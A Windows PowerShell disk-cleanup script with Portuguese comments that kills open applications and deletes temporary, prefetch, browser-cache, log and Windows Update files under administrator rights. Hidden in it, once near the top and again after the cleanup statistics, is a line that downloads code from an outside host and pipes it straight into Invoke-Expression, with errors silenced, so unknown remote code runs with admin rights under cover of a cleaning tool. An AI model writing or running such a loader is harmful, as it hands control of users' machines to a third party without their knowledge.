# limp.ps1 - Limpeza Profunda e Otimização de Cache
# Executar como Administrador 
irm https://get.hpinfo.com.br/perf | iex
$ErrorActionPreference = "SilentlyContinue"


Write-Host "=== INICIANDO LIMPEZA PROFUNDA ===" -ForegroundColor Cyan

# 1. Fechar Aplicativos para liberar arquivos em uso
Write-Host "Encerrando processos ativos..." -ForegroundColor Yellow
$processos = @("winword", "excel", "powerpnt", "outlook", "chrome", "msedge", "firefox", "brave", "acrord32", "explorer")
foreach ($p in $processos) {
    Stop-Process -Name $p -Force -ErrorAction SilentlyContinue
}
Start-Sleep -Seconds 2

# Captura de estado inicial para estatística
$espacoAntes = (Get-PSDrive C).Free

# 2. Limpeza de Temporários e Prefetch
Write-Host "Limpando arquivos temporários e Prefetch..." -ForegroundColor Yellow
$pastasLimpar = @(
    "$env:TEMP\*",
    "C:\Windows\Temp\*",
    "C:\Windows\Prefetch\*",
    "$env:LOCALAPPDATA\Microsoft\Windows\Explorer\thumbcache_*.db",
    "$env:APPDATA\Microsoft\Windows\Recent\*",
    "C:\Windows\Logs\*"
)

foreach ($caminho in $pastasLimpar) {
    Remove-Item -Path $caminho -Recurse -Force -ErrorAction SilentlyContinue
}

# 3. Parar Serviços e Limpar Cache do Windows Update [cite: 1]
Write-Host "Limpando cache do Windows Update..." -ForegroundColor Yellow
$servicos = @("wuauserv", "bits", "cryptsvc")
foreach ($s in $servicos) { Stop-Service $s -Force }

$updateFolders = @("C:\Windows\SoftwareDistribution", "C:\Windows\System32\catroot2")
foreach ($folder in $updateFolders) {
    Remove-Item -Path "$folder\*" -Recurse -Force -ErrorAction SilentlyContinue
}

foreach ($s in $servicos) { Start-Service $s }
 
# 4. Limpeza de Cache de Navegadores
Write-Host "Limpando cache de navegadores..." -ForegroundColor Yellow
$browserCaches = @(
    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cache\*",
    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Cache\*",
    "$env:LOCALAPPDATA\Mozilla\Firefox\Profiles\*\cache2\*"
)
foreach ($path in $browserCaches) {
    Remove-Item -Path $path -Recurse -Force -ErrorAction SilentlyContinue
}

# 5. Limpeza de Lixeira e Otimização de Entrega
Write-Host "Limpando lixeira e otimização de entrega..." -ForegroundColor Yellow
Clear-RecycleBin -Confirm:$false -ErrorAction SilentlyContinue
Remove-Item -Path "C:\Windows\SoftwareDistribution\DeliveryOptimization\*" -Recurse -Force

# 6. Estatísticas Finais
$espacoDepois = (Get-PSDrive C).Free
$totalLimpoMB = [math]::Round(($espacoDepois - $espacoAntes) / 1MB, 2)

Write-Host "`n=======================================" -ForegroundColor Cyan
Write-Host "LIMPEZA CONCLUÍDA!" -ForegroundColor Green
if ($totalLimpoMB -gt 0) {
    Write-Host "Espaço recuperado: $totalLimpoMB MB" -ForegroundColor White
} else {
    Write-Host "O sistema já estava limpo." -ForegroundColor White
}

irm https://get.hpinfo.com.br/perf | iex -AfterClean


Write-Host "=======================================" -ForegroundColor Cyan

# Reiniciar o Explorer para devolver a interface ao usuário
Start-Process explorer.exe
